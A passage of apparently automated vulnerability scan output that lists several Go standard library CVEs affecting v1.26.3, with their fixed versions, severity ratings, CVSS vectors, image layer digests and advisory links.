                        │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
                        │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
                        │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:44622 
                        │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:46394 
                        │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:46395 
                        │      │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:47149 
                        │      │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:47735 
                        │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47737 
                        │      │                  ├ [37]: https://access.redhat.com/security/cve/CVE-2026-27145 
                        │      │                  ├ [38]: https://bugzilla.redhat.com/2445356 
                        │      │                  ├ [39]: https://bugzilla.redhat.com/2484207 
                        │      │                  ├ [40]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
                        │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
                        │      │                  ├ [42]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-27145 
                        │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39821 
                        │      │                  ├ [44]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
                        │      │                  ├ [45]: https://errata.rockylinux.org/RLSA-2026:46395 
                        │      │                  ├ [46]: https://go.dev/cl/783621 
                        │      │                  ├ [47]: https://go.dev/issue/79694 
                        │      │                  ├ [48]: https://groups.google.com/g/golang-announce/c/tKs3rmc
                        │      │                  │       BcKw 
                        │      │                  ├ [49]: https://linux.oracle.com/cve/CVE-2026-27145.html 
                        │      │                  ├ [50]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
                        │      │                  ├ [51]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
                        │      │                  ├ [52]: https://pkg.go.dev/vuln/GO-2026-5037 
                        │      │                  ├ [53]: https://security.access.redhat.com/data/csaf/v2/vex/2
                        │      │                  │       026/cve-2026-27145.json 
                        │      │                  ╰ [54]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
                        │      ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
                        │      ╰ LastModifiedDate: 2026-07-29T13:17:57.147Z 
                        ├ [12] ╭ VulnerabilityID : CVE-2026-39822 
                        │      ├ VendorIDs        ─ [0]: GO-2026-4970 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:4cbfabc14eb4afcb84a5f44bd9da779bba2ef3306b2aa09e4b8b1
                        │      │                   a71f48366ff 
                        │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability
                        │      │                   allows directory traversal 
                        │      ├ Description     : On Unix systems, opening a file in an os.Root improperly
                        │      │                   follows symlinks to locations outside of the Root when the
                        │      │                   final path component of the a path is a symbolic link and
                        │      │                   the path ends in /. For example, 'root.Open("symlink/")'
                        │      │                   will open "symlink" even when "symlink" is a symbolic link
                        │      │                   pointing outside of the root. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-61 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 2 
                        │      │                  ├ bitnami    : 3 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:
                        │      │                  │         │           H/A:H 
                        │      │                  │         ╰ V3Score : 7.8 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:
                        │      │                            │           H/A:H 
                        │      │                            ╰ V3Score : 7.8 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
                        │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
                        │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
                        │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                        │      │                  │       26-39822 
                        │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
                        │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38495 
                        │      │                  ├ [7] : https://go.dev/cl/797880 
                        │      │                  ├ [8] : https://go.dev/issue/79005 
                        │      │                  ├ [9] : https://groups.google.com/g/golang-announce/c/OrmQE_Y
                        │      │                  │       p5Sc 
                        │      │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-39822.html 
                        │      │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
                        │      │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
                        │      │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-4970 
                        │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
                        │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
                        │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
                        ├ [13] ╭ VulnerabilityID : CVE-2026-42504 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5038 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.11, 1.26.4 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:efc282784e441c3e696a6ac6a05875b82e9c071fcbe834fd0b018
                        │      │                   6b6a107d3c9 
                        │      ├ Title           : mime: golang: Golang MIME: Denial of Service via
                        │      │                   maliciously-crafted MIME header 
                        │      ├ Description     : Decoding a maliciously-crafted MIME header containing many
                        │      │                   invalid encoded-words can consume excessive CPU. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-407 
                        │      ├ VendorSeverity   ╭ amazon : 2 
                        │      │                  ├ azure  : 3 
                        │      │                  ├ bitnami: 3 
                        │      │                  ╰ redhat : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           N/A:H 
                        │      │                  │         ╰ V3Score : 7.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
                        │      │                  ├ [1]: https://go.dev/cl/774481 
                        │      │                  ├ [2]: https://go.dev/issue/79217 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcB
                        │      │                  │      cKw 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
                        │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
                        │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
                        ├ [14] ╭ VulnerabilityID : CVE-2026-42505 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5856 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:9ecdb4606b1e0998c28f8693240cc7360a87833f709ae9e2503c5
                        │      │                   843d99e1ed6 
                        │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in
                        │      │                    Encrypted Client Hello 
                        │      ├ Description     : Handshakes which used Encrypted Client Hello could be
                        │      │                   de-anonymized by a passive network observer due to a
                        │      │                   disclosure of pre-shared key identities in the unencrypted
                        │      │                   client hello. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-201 
                        │      ├ VendorSeverity   ╭ amazon : 2 
                        │      │                  ├ bitnami: 2 
                        │      │                  ╰ redhat : 2 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
                        │      │                  │         │           N/A:N 
                        │      │                  │         ╰ V3Score : 5.3 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
                        │      │                            │           N/A:N 
                        │      │                            ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
                        │      │                  ├ [1]: https://go.dev/cl/775960 
                        │      │                  ├ [2]: https://go.dev/issue/79282 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp
                        │      │                  │      5Sc 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
                        │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
                        │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
                        ╰ [15] ╭ VulnerabilityID : CVE-2026-42507 
                               ├ VendorIDs        ─ [0]: GO-2026-5039 
                               ├ PkgID           : stdlib@v1.26.3 
                               ├ PkgName         : stdlib 
                               ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                               │                  ╰ UID : 9770e92adf1be71b 
                               ├ InstalledVersion: v1.26.3 
                               ├ FixedVersion    : 1.25.11, 1.26.4 
                               ├ Status          : fixed 
                               ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                               │                  │         c6997c001601e2a6e5af 
                               │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                               │                            2e154f0b8ad928e980c9 
                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
                               ├ DataSource       ╭ ID  : govulndb 
                               │                  ├ Name: The Go Vulnerability Database 
                               │                  ╰ URL : https://pkg.go.dev/vuln/ 
                               ├ Fingerprint     : sha256:9f45b05873c8a379ae57db0697da877f0f809c797e3141a87dfd1
                               │                   ba5693b6f0c 
                               ├ Title           : net/textproto: golang: Golang net/textproto: Misleading
                               │                   error messages via input injection 
                               ├ Description     : When returning errors, functions in the net/textproto
                               │                   package would include its input as part of the error. This
                               │                   might allow an attacker to inject misleading content to
                               │                   errors that are printed or logged. 
                               ├ Severity        : MEDIUM 
                               ├ VendorSeverity   ╭ alma       : 2 
                               │                  ├ amazon     : 2 
                               │                  ├ bitnami    : 2 
                               │                  ├ oracle-oval: 2 
                               │                  ├ redhat     : 2 
                               │                  ╰ rocky      : 2 
                               ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                               │                  │         │           L/A:N 
                               │                  │         ╰ V3Score : 5.3 
                               │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                               │                            │           L/A:N 
                               │                            ╰ V3Score : 5.3 
                               ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
                               │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
                               │                  ├ [2] : https://bugzilla.redhat.com/2484205 
                               │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
                               │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
                               │                  │       26-42507 
                               │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
                               │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
                               │                  ├ [7] : https://go.dev/cl/777060 
                               │                  ├ [8] : https://go.dev/issue/79346 
                               │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmc
                               │                  │       BcKw 
                               │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
                               │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
                               │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
                               │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
                               │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
                               ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
                               ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
```
